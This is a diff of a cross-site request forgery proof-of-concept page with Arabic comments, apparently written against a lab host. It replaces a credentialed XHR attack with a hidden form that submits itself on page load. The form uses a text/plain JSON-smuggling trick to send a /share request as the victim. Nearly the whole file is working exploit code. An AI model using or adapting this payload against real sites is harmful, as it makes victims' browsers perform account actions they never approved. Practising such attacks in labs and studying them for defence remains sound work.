@@ -1,32 +1,12 @@
 <!DOCTYPE html>
-<html>
-<head>
-    <title>CSRF POC - Exact Match</title>
-</head>
-<body onload="triggerCSRF()">
-    <h1>CSRF Attack POC - مطابق تماماً</h1>
-    <div id="status">جاري...</div>
-
-    <script>
-        function triggerCSRF() {
-            const xhr = new XMLHttpRequest();
-            
-            xhr.open('POST', 'https://ptl-79baa299fd24-30bb5f04ec85.libcurl.me/share', true);
-            
-            xhr.setRequestHeader('Content-Type', 'application/json');
-            xhr.withCredentials = true; // نفس الكوكيز
-            
-            xhr.onreadystatechange = function() {
-                if (xhr.readyState === 4) {
-                    document.getElementById('status').innerHTML = 
-                        `✅ تم! Status: ${xhr.status}`;
-                    document.getElementById('status').style.color = 'green';
-                }
-            };
-            
-            // نفس الـ payload بالضبط
-            xhr.send('{"user":"user1@gmail.com","id":0}');
-        }
-    </script>
+<body>
+    <!-- هذا يتجاوز CORS تماماً -->
+    <form action="https://ptl-79baa299fd24-30bb5f04ec85.libcurl.me/share" 
+          method="POST" 
+          enctype="text/plain"
+          style="display:none">
+        <input name='{"user":"user1@gmail.com","id":0}' value='x'>
+    </form>
+    <script>document.forms[0].submit();</script>
 </body>
 </html>
